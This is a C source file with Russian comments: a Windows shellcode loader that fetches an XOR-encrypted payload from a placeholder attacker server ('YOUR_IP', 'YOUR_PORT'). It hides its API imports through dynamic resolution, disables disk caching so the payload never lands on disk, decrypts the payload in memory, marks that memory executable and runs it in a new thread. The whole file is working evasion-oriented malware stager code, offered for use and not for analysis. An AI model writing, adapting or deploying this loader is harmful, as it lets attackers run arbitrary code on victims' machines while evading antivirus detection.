#include <windows.h>
#include <wininet.h>
#include <stdio.h>

// Прототипы функций для динамического вызова (динамическое разрешение API)
typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* fnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

int main() {
    // Настройки подключения к вашему серверу Python
    const wchar_t* host = L"YOUR_IP";
    int port = YOUR_PORT;
    const wchar_t* path = L"data.enc"; // Имя зашифрованного файла на сервере

    // 1. Динамический поиск адресов функций в kernel32.dll (для скрытия из таблицы импорта)
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) return 1;

    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)GetProcAddress(hKernel32, "VirtualProtect");
    fnCreateThread pCreateThread = (fnCreateThread)GetProcAddress(hKernel32, "CreateThread");

    if (!pVirtualAlloc || !pVirtualProtect || !pCreateThread) return 1;

    // 2. Инициализация WinINet сессии
    HINTERNET hInternet = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 1;

    HINTERNET hConnect = InternetConnectW(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return 1; }

    // Важно: Флаг INTERNET_FLAG_NO_CACHE_WRITE запрещает Windows сохранять файл в INetCache на диск!
    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", path, NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) { 
        InternetCloseHandle(hConnect); 
        InternetCloseHandle(hInternet); 
        return 1; 
    }

    if (!HttpSendRequestW(hRequest, NULL, 0, NULL, 0)) {
        InternetCloseHandle(hRequest); 
        InternetCloseHandle(hConnect); 
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Выделение буфера в куче для приема файла напрямую в оперативную память
    DWORD max_size = 10 * 1024 * 1024; // Лимит 10 МБ
    PBYTE tmp_buf = (PBYTE)malloc(max_size);
    if (!tmp_buf) {
        InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet);
        return 1;
    }

    DWORD total_bytes = 0;
    DWORD bytes_read = 0;

    // Поточное чтение в память
    while (InternetReadFile(hRequest, tmp_buf + total_bytes, 4096, &bytes_read) && bytes_read > 0) {
        total_bytes += bytes_read;
    }

    // Закрываем сетевые дескрипторы, так как данные уже у нас в оперативной памяти
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    if (total_bytes == 0) { free(tmp_buf); return 1; }

    // 3. Расшифровка XOR прямо в памяти (на диске файл не появлялся в открытом виде)
    BYTE key = 0x5A; // Тот же ключ, что использовался при создании data.enc
    for (DWORD i = 0; i < total_bytes; i++) {
        tmp_buf[i] = tmp_buf[i] ^ key;
    }

    // 4. Выделение памяти без прав на выполнение (только чтение и запись: PAGE_READWRITE)
    LPVOID addr = pVirtualAlloc(NULL, total_bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (addr) {
        // Копируем расшифрованный шелл-код в выделенный регион
        RtlMoveMemory(addr, tmp_buf, total_bytes);

        // 5. Безопасная смена прав: убираем запись, добавляем выполнение (PAGE_EXECUTE_READ)
        DWORD oldProtect;
        if (pVirtualProtect(addr, total_bytes, PAGE_EXECUTE_READ, &oldProtect)) {
            
            // 6. Запуск выполнения кода в новом потоке
            HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
            if (hThread) {
                WaitForSingleObject(hThread, INFINITE);
                CloseHandle(hThread);
            }
        }
    }

    // Очистка временного буфера
    free(tmp_buf);
    return 0;
}
